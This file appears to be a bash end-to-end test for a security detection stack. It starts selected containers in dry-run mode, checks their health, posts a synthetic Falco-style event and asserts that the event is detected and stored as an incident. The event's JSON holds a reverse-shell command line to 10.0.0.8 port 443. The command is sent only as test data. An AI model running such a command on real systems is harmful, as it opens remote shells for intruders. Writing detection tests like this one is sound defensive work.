#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ENV_FILE="${ROOT}/deploy/.env"

if [[ ! -f "$ENV_FILE" ]]; then
  echo "ERROR: deploy/.env missing. Run deploy/bootstrap.sh first." >&2
  exit 1
fi
command -v docker >/dev/null 2>&1 || {
  echo "ERROR: Docker is required for stack E2E." >&2
  exit 1
}

set -a
# shellcheck disable=SC1091
. "$ENV_FILE"
set +a

# Isolated project; production behavior remains enabled by default elsewhere.
export COMPOSE_PROJECT_NAME=acids-e2e
export RESPONSE_MODE=dry-run
export SENTINELMESH_RECLAIM_ENABLED=false
export DETECTION_BUILD_TAGS=e2e

COMPOSE=(docker compose
  --project-name "$COMPOSE_PROJECT_NAME"
  --env-file "$ENV_FILE"
  -f "$ROOT/deploy/docker-compose.prod.yml"
  -f "$ROOT/deploy/docker-compose.e2e-safe.yml")

cleanup() {
  "${COMPOSE[@]}" down --remove-orphans --volumes >/dev/null 2>&1 || true
}
trap cleanup EXIT

"${COMPOSE[@]}" config -q
# Do not use bare `up`: these are the only permitted services for this test.
# This deliberately omits Falco, the privileged host-agent, and Prometheus.
"${COMPOSE[@]}" up -d --build postgres control-plane llm-orchestration detection-engine

active_services="$("${COMPOSE[@]}" ps --services --status running)"
if grep -Eq '^(falco|host-agent|prometheus)$' <<<"$active_services"; then
  echo "ERROR: unsafe service unexpectedly started: $active_services" >&2
  "${COMPOSE[@]}" ps
  exit 1
fi

for url in \
  http://127.0.0.1:8080/actuator/health \
  http://127.0.0.1:2112/healthz; do
  echo "checking $url"
  healthy=0
  for _ in $(seq 1 60); do
    if curl -fsS --max-time 2 "$url" >/dev/null 2>&1; then
      healthy=1
      break
    fi
    sleep 2
  done
  if [[ "$healthy" != 1 ]]; then
    echo "ERROR: endpoint did not become healthy: $url" >&2
    "${COMPOSE[@]}" ps
    "${COMPOSE[@]}" logs --tail=120
    exit 1
  fi
done

echo "checking LLM orchestration health inside its container"
llm_healthy=0
for _ in $(seq 1 60); do
  if "${COMPOSE[@]}" exec -T llm-orchestration python -c \
    "import urllib.request; urllib.request.urlopen('http://127.0.0.1:8090/healthz', timeout=2).read()" \
    >/dev/null 2>&1; then
    llm_healthy=1
    break
  fi
  sleep 2
done
if [[ "$llm_healthy" != 1 ]]; then
  echo "ERROR: internal LLM health endpoint did not become healthy" >&2
  "${COMPOSE[@]}" ps
  "${COMPOSE[@]}" logs --tail=120 llm-orchestration
  exit 1
fi

# Synthetic Falco-shaped event only. Real Falco/eBPF and host-agent actions
# require a separate disposable VM test.
curl -fsS --max-time 5 -X POST 'http://127.0.0.1:8766/falco/events' \
  -H 'Content-Type: application/json' \
  -d '{"time":"2026-10-08T00:00:00Z","rule":"Synthetic Reverse Shell","priority":"Critical","evt.type":"execve","output":"bash -c /dev/tcp/10.0.0.8/443","output_fields":{"proc.pid":"424242","proc.ppid":"424241","proc.exe":"/bin/bash","proc.cmdline":"/bin/bash -c bash -i >& /dev/tcp/10.0.0.8/443 0>&1","proc.name":"bash","proc.pname":"nginx","user.name":"root","fd.typechar":"4","fd.rip":"10.0.0.8","fd.rport":"443"}}' \
  >/dev/null

detected=0
for _ in $(seq 1 30); do
  if curl -fsS --max-time 2 http://127.0.0.1:2112/metrics |
      grep -Eq 'sentinelmesh_detections_total[^0-9]*[1-9]'; then
    detected=1
    break
  fi
  sleep 1
done
if [[ "$detected" != 1 ]]; then
  echo "ERROR: synthetic event was not detected" >&2
  "${COMPOSE[@]}" ps
  "${COMPOSE[@]}" logs --tail=120 detection-engine
  exit 1
fi

persisted=0
last_http_status="not_attempted"
incidents=""

for _ in $(seq 1 30); do
  response="$(curl -sS --max-time 2 \
    -w $'\n__HTTP_STATUS__:%{http_code}' \
    -H "X-SentinelMesh-Api-Key: ${DETECTION_ENGINE_KEY}" \
    'http://127.0.0.1:8080/incidents?limit=100' 2>/dev/null || true)"

  if [[ "$response" == *$'\n__HTTP_STATUS__:'* ]]; then
    last_http_status="${response##*__HTTP_STATUS__:}"
    incidents="${response%$'\n__HTTP_STATUS__:'*}"
  else
    last_http_status="000"
    incidents="$response"
  fi

  if INCIDENTS_JSON="$incidents" python3 - <<'PYVERIFY'
import json, os
try:
    items = json.loads(os.environ.get("INCIDENTS_JSON", ""))
except (json.JSONDecodeError, TypeError):
    raise SystemExit(1)
if isinstance(items, list) and any(
    isinstance(i, dict) and i.get("actionTaken") == "escalate_to_reclaim"
    for i in items
):
    raise SystemExit(0)
raise SystemExit(1)
PYVERIFY
  then
    persisted=1
    break
  fi

  sleep 1
done

if [[ "$persisted" != 1 ]]; then
  echo "ERROR: incident persistence assertion failed; GET /incidents HTTP status: ${last_http_status}" >&2

  INCIDENTS_JSON="$incidents" python3 - <<'PYDIAG'
import json, os
body = os.environ.get("INCIDENTS_JSON", "")
try:
    data = json.loads(body)
except (json.JSONDecodeError, TypeError):
    print("Incident-list response: empty or invalid JSON.")
else:
    if isinstance(data, list):
        print("Incident records returned:", len(data))
        actions = sorted({
            str(item.get("actionTaken", "<missing>"))
            for item in data if isinstance(item, dict)
        })
        print("Observed actionTaken values:",
              ", ".join(actions[:10]) if actions else "none")
    else:
        print("Incident-list JSON type:", type(data).__name__)
PYDIAG

  "${COMPOSE[@]}" ps
  "${COMPOSE[@]}" logs --tail=120 detection-engine control-plane postgres
  exit 1
fi

echo "SAFE STACK E2E PASS: synthetic event -> normalization -> deterministic detection -> incident transport -> database persistence."
echo "Excluded by design: live Falco/eBPF capture, privileged host-agent, host filesystem actions, and reclaim."
